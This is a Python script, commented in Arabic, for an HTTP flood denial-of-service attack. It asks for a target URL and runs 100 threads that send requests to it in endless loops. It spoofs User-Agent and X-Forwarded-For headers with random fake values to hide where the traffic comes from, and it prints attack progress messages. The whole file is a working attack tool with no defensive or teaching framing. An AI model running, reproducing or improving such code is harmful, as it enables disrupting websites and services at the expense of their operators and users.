كimport urllib.request
import threading
import random
import time
import concurrent.futures
from colorama import Fore, init
from faker import Faker
from halo import Halo

# تهيئة Colorama
init(autoreset=True)

# تهيئة Faker
fake = Faker()

# متغيرات التحكم
request_counter = 0
flag = 0
lock = threading.Lock()

def inc_counter():
    global request_counter
    with lock:
        request_counter += 1

def set_flag(value):
    global flag
    flag = value

def httpcall(url):
    headers = {
        "User-Agent": fake.user_agent(),
        "X-Forwarded-For": fake.ipv4(),
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        urllib.request.urlopen(req)
        inc_counter()
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f"{Fore.RED}( {e.code} ) {Fore.MAGENTA}Response Code!")
    except Exception:
        pass  # تجاهل الأخطاء الأخرى

def attack(url):
    while flag < 2:
        try:
            httpcall(url)
            time.sleep(random.uniform(0.1, 0.5))  # تأخير عشوائي بين 100ms و 500ms
        except Exception as e:
            print(f"{Fore.RED}Error in thread: {e}{Fore.RESET}")

def monitor_requests():
    sent = 0
    previous = 0
    spinner = Halo(text="Attacking...", spinner="dots")
    spinner.start()
    
    while flag == 0:
        with lock:
            if request_counter >= previous + 100:
                sent += 1
                print(f"{Fore.YELLOW}( {sent} ) {Fore.GREEN}Request Sent! --> Total: {request_counter}.")
                previous = request_counter
        time.sleep(1)  # تحديث كل ثانية

    spinner.stop()
    if flag == 2:
        print(f"{Fore.RED}-- Attack Finished --{Fore.RESET}")

def start_attack(url, thread_count=100):
    global flag
    flag = 0
    
    monitor_thread = threading.Thread(target=monitor_requests)
    monitor_thread.start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        try:
            futures = [executor.submit(attack, url) for _ in range(thread_count)]
            concurrent.futures.wait(futures)
        except KeyboardInterrupt:
            set_flag(2)
            print(f"{Fore.YELLOW}( FINISH ) {Fore.RED}Attack Stopped by user.{Fore.RESET}")
            
# تشغيل الهجوم
if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    start_attack(target_url, thread_count=100)